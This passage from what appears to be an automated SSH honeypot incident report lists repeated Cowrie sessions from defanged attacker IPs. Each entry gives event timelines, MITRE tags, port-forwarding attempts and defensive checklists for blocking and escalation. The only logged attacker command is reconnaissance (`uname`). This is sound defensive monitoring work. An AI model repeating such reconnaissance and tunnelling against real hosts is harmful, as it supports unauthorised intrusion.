| `2026-08-08 01:01:54` | `cowrie.log.closed` |
| `2026-08-08 01:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d5be79d258

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:56` | `cowrie.session.connect` |
| `2026-08-08 01:01:56` | `cowrie.client.version` |
| `2026-08-08 01:01:56` | `cowrie.client.kex` |
| `2026-08-08 01:01:56` | `cowrie.login.success` |
| `2026-08-08 01:01:57` | `cowrie.session.params` |
| `2026-08-08 01:01:57` | `cowrie.command.input` |
| `2026-08-08 01:01:57` | `cowrie.log.closed` |
| `2026-08-08 01:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a096ee927930

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 01:01 |
| **Last Seen** | 2026-08-08 01:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:01:58` | `cowrie.session.connect` |
| `2026-08-08 01:01:58` | `cowrie.client.version` |
| `2026-08-08 01:01:58` | `cowrie.client.kex` |
| `2026-08-08 01:01:59` | `cowrie.login.success` |
| `2026-08-08 01:01:59` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:01:59` | `cowrie.direct-tcpip.data` |
| `2026-08-08 01:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38646c887b16

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:02 |
| **Last Seen** | 2026-08-08 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:02:01` | `cowrie.session.connect` |
| `2026-08-08 01:02:01` | `cowrie.client.version` |
| `2026-08-08 01:02:01` | `cowrie.client.kex` |
| `2026-08-08 01:02:01` | `cowrie.login.success` |
| `2026-08-08 01:02:02` | `cowrie.session.params` |
| `2026-08-08 01:02:02` | `cowrie.command.input` |
| `2026-08-08 01:02:03` | `cowrie.log.closed` |
| `2026-08-08 01:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-907d5e079a8f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:02 |
| **Last Seen** | 2026-08-08 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:02:06` | `cowrie.session.connect` |
| `2026-08-08 01:02:06` | `cowrie.client.version` |
| `2026-08-08 01:02:06` | `cowrie.client.kex` |
| `2026-08-08 01:02:07` | `cowrie.login.success` |
| `2026-08-08 01:02:07` | `cowrie.session.params` |
| `2026-08-08 01:02:07` | `cowrie.command.input` |
| `2026-08-08 01:02:07` | `cowrie.log.closed` |
| `2026-08-08 01:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95566cb563a6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:02 |
| **Last Seen** | 2026-08-08 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:02:11` | `cowrie.session.connect` |
| `2026-08-08 01:02:11` | `cowrie.client.version` |
| `2026-08-08 01:02:12` | `cowrie.client.kex` |
| `2026-08-08 01:02:12` | `cowrie.login.success` |
| `2026-08-08 01:02:13` | `cowrie.session.params` |
| `2026-08-08 01:02:13` | `cowrie.command.input` |
| `2026-08-08 01:02:13` | `cowrie.log.closed` |
| `2026-08-08 01:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a69c8d17859

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:02 |
| **Last Seen** | 2026-08-08 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:02:17` | `cowrie.session.connect` |
| `2026-08-08 01:02:17` | `cowrie.client.version` |
| `2026-08-08 01:02:17` | `cowrie.client.kex` |
| `2026-08-08 01:02:17` | `cowrie.login.success` |
| `2026-08-08 01:02:18` | `cowrie.session.params` |
| `2026-08-08 01:02:18` | `cowrie.command.input` |
| `2026-08-08 01:02:18` | `cowrie.log.closed` |
| `2026-08-08 01:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01b7ac6c9c5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 01:02 |
| **Last Seen** | 2026-08-08 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:02:22` | `cowrie.session.connect` |
| `2026-08-08 01:02:22` | `cowrie.client.version` |
| `2026-08-08 01:02:22` | `cowrie.client.kex` |
| `2026-08-08 01:02:22` | `cowrie.login.success` |
| `2026-08-08 01:02:23` | `cowrie.session.params` |
| `2026-08-08 01:02:23` | `cowrie.command.input` |
| `2026-08-08 01:02:23` | `cowrie.log.closed` |
| `2026-08-08 01:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83820fd60254

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:03 |
| **Last Seen** | 2026-08-08 01:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:03:35` | `cowrie.session.connect` |
| `2026-08-08 01:03:35` | `cowrie.client.version` |
| `2026-08-08 01:03:35` | `cowrie.client.kex` |
| `2026-08-08 01:03:35` | `cowrie.login.success` |
| `2026-08-08 01:03:36` | `cowrie.session.params` |
| `2026-08-08 01:03:36` | `cowrie.command.input` |
| `2026-08-08 01:03:36` | `cowrie.log.closed` |
| `2026-08-08 01:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22ee07f49a6e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:05 |
| **Last Seen** | 2026-08-08 01:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:05:13` | `cowrie.session.connect` |
| `2026-08-08 01:05:13` | `cowrie.client.version` |
| `2026-08-08 01:05:13` | `cowrie.client.kex` |
| `2026-08-08 01:05:13` | `cowrie.login.success` |
| `2026-08-08 01:05:14` | `cowrie.session.params` |
| `2026-08-08 01:05:14` | `cowrie.command.input` |
| `2026-08-08 01:05:14` | `cowrie.log.closed` |
| `2026-08-08 01:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d842eee28e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:06 |
| **Last Seen** | 2026-08-08 01:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:06:52` | `cowrie.session.connect` |
| `2026-08-08 01:06:52` | `cowrie.client.version` |
| `2026-08-08 01:06:52` | `cowrie.client.kex` |
| `2026-08-08 01:06:52` | `cowrie.login.success` |
| `2026-08-08 01:06:53` | `cowrie.session.params` |
| `2026-08-08 01:06:53` | `cowrie.command.input` |
| `2026-08-08 01:06:53` | `cowrie.log.closed` |
| `2026-08-08 01:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb7f4f0290f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:08 |
| **Last Seen** | 2026-08-08 01:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:08:29` | `cowrie.session.connect` |
| `2026-08-08 01:08:29` | `cowrie.client.version` |
| `2026-08-08 01:08:29` | `cowrie.client.kex` |
| `2026-08-08 01:08:30` | `cowrie.login.success` |
| `2026-08-08 01:08:31` | `cowrie.session.params` |
| `2026-08-08 01:08:31` | `cowrie.command.input` |
| `2026-08-08 01:08:31` | `cowrie.log.closed` |
| `2026-08-08 01:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa22eb635c5f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:10 |
| **Last Seen** | 2026-08-08 01:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:10:05` | `cowrie.session.connect` |
| `2026-08-08 01:10:05` | `cowrie.client.version` |
| `2026-08-08 01:10:06` | `cowrie.client.kex` |
| `2026-08-08 01:10:06` | `cowrie.login.success` |
| `2026-08-08 01:10:07` | `cowrie.session.params` |
| `2026-08-08 01:10:07` | `cowrie.command.input` |
| `2026-08-08 01:10:07` | `cowrie.log.closed` |
| `2026-08-08 01:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac5b6026cfd6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:11 |
| **Last Seen** | 2026-08-08 01:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:11:40` | `cowrie.session.connect` |
| `2026-08-08 01:11:40` | `cowrie.client.version` |
| `2026-08-08 01:11:40` | `cowrie.client.kex` |
| `2026-08-08 01:11:41` | `cowrie.login.success` |
| `2026-08-08 01:11:42` | `cowrie.session.params` |
| `2026-08-08 01:11:42` | `cowrie.command.input` |
| `2026-08-08 01:11:42` | `cowrie.log.closed` |
| `2026-08-08 01:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b091a986278d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:13 |
| **Last Seen** | 2026-08-08 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:13:17` | `cowrie.session.connect` |
| `2026-08-08 01:13:17` | `cowrie.client.version` |
| `2026-08-08 01:13:17` | `cowrie.client.kex` |
| `2026-08-08 01:13:17` | `cowrie.login.success` |
| `2026-08-08 01:13:18` | `cowrie.session.params` |
| `2026-08-08 01:13:18` | `cowrie.command.input` |
| `2026-08-08 01:13:18` | `cowrie.log.closed` |
| `2026-08-08 01:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3fda69f61a

| Field | Detail |
|---|---|
| **Source IP** | `195.133.156[.]116` |
| **First Seen** | 2026-08-08 01:14 |
| **Last Seen** | 2026-08-08 01:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:14:41` | `cowrie.session.connect` |
| `2026-08-08 01:14:42` | `cowrie.client.version` |
| `2026-08-08 01:14:42` | `cowrie.client.kex` |
| `2026-08-08 01:14:43` | `cowrie.login.success` |
| `2026-08-08 01:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.133.156[.]116` to AbuseIPDB if not already reported
- [ ] Block `195.133.156[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45fca849092e

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-08-08 01:14 |
| **Last Seen** | 2026-08-08 01:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:14:53` | `cowrie.session.connect` |
| `2026-08-08 01:14:53` | `cowrie.client.version` |
| `2026-08-08 01:14:53` | `cowrie.client.kex` |
| `2026-08-08 01:14:56` | `cowrie.login.success` |
| `2026-08-08 01:14:56` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef7f9732df3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:14 |
| **Last Seen** | 2026-08-08 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:14:56` | `cowrie.session.connect` |
| `2026-08-08 01:14:56` | `cowrie.client.version` |
| `2026-08-08 01:14:57` | `cowrie.client.kex` |
| `2026-08-08 01:14:57` | `cowrie.login.success` |
| `2026-08-08 01:14:57` | `cowrie.session.params` |
| `2026-08-08 01:14:57` | `cowrie.command.input` |
| `2026-08-08 01:14:58` | `cowrie.log.closed` |
| `2026-08-08 01:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0f877bbaeb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:16 |
| **Last Seen** | 2026-08-08 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:16:35` | `cowrie.session.connect` |
| `2026-08-08 01:16:35` | `cowrie.client.version` |
| `2026-08-08 01:16:35` | `cowrie.client.kex` |
| `2026-08-08 01:16:36` | `cowrie.login.success` |
| `2026-08-08 01:16:37` | `cowrie.session.params` |
| `2026-08-08 01:16:37` | `cowrie.command.input` |
| `2026-08-08 01:16:37` | `cowrie.log.closed` |
| `2026-08-08 01:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448832884ea1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:18 |
| **Last Seen** | 2026-08-08 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:18:15` | `cowrie.session.connect` |
| `2026-08-08 01:18:15` | `cowrie.client.version` |
| `2026-08-08 01:18:15` | `cowrie.client.kex` |
| `2026-08-08 01:18:15` | `cowrie.login.success` |
| `2026-08-08 01:18:16` | `cowrie.session.params` |
| `2026-08-08 01:18:16` | `cowrie.command.input` |
| `2026-08-08 01:18:16` | `cowrie.log.closed` |
| `2026-08-08 01:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715195d75cf4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:19 |
| **Last Seen** | 2026-08-08 01:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:19:57` | `cowrie.session.connect` |
| `2026-08-08 01:19:57` | `cowrie.client.version` |
| `2026-08-08 01:19:57` | `cowrie.client.kex` |
| `2026-08-08 01:19:58` | `cowrie.login.success` |
| `2026-08-08 01:19:58` | `cowrie.session.params` |
| `2026-08-08 01:19:58` | `cowrie.command.input` |
| `2026-08-08 01:19:58` | `cowrie.log.closed` |
| `2026-08-08 01:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5043c8e17721

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:21 |
| **Last Seen** | 2026-08-08 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:21:41` | `cowrie.session.connect` |
| `2026-08-08 01:21:41` | `cowrie.client.version` |
| `2026-08-08 01:21:41` | `cowrie.client.kex` |
| `2026-08-08 01:21:41` | `cowrie.login.success` |
| `2026-08-08 01:21:42` | `cowrie.session.params` |
| `2026-08-08 01:21:42` | `cowrie.command.input` |
| `2026-08-08 01:21:42` | `cowrie.log.closed` |
| `2026-08-08 01:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e2fcd79c9e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:23 |
| **Last Seen** | 2026-08-08 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:23:17` | `cowrie.session.connect` |
| `2026-08-08 01:23:17` | `cowrie.client.version` |
| `2026-08-08 01:23:17` | `cowrie.client.kex` |
| `2026-08-08 01:23:18` | `cowrie.login.success` |
| `2026-08-08 01:23:18` | `cowrie.session.params` |
| `2026-08-08 01:23:18` | `cowrie.command.input` |
| `2026-08-08 01:23:18` | `cowrie.log.closed` |
| `2026-08-08 01:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abfe6f7eeaa5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:24 |
| **Last Seen** | 2026-08-08 01:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:24:53` | `cowrie.session.connect` |
| `2026-08-08 01:24:53` | `cowrie.client.version` |
| `2026-08-08 01:24:53` | `cowrie.client.kex` |
| `2026-08-08 01:24:53` | `cowrie.login.success` |
| `2026-08-08 01:24:54` | `cowrie.session.params` |
| `2026-08-08 01:24:54` | `cowrie.command.input` |
| `2026-08-08 01:24:54` | `cowrie.log.closed` |
| `2026-08-08 01:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af5410773459

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:26 |
| **Last Seen** | 2026-08-08 01:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:26:31` | `cowrie.session.connect` |
| `2026-08-08 01:26:31` | `cowrie.client.version` |
| `2026-08-08 01:26:31` | `cowrie.client.kex` |
| `2026-08-08 01:26:31` | `cowrie.login.success` |
| `2026-08-08 01:26:32` | `cowrie.session.params` |
| `2026-08-08 01:26:32` | `cowrie.command.input` |
| `2026-08-08 01:26:32` | `cowrie.log.closed` |
| `2026-08-08 01:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-780fe04215fb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:28 |
| **Last Seen** | 2026-08-08 01:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:28:11` | `cowrie.session.connect` |
| `2026-08-08 01:28:11` | `cowrie.client.version` |
| `2026-08-08 01:28:11` | `cowrie.client.kex` |
| `2026-08-08 01:28:12` | `cowrie.login.success` |
| `2026-08-08 01:28:12` | `cowrie.session.params` |
| `2026-08-08 01:28:12` | `cowrie.command.input` |
| `2026-08-08 01:28:13` | `cowrie.log.closed` |
| `2026-08-08 01:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ce624a02efb

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-08-08 01:28 |
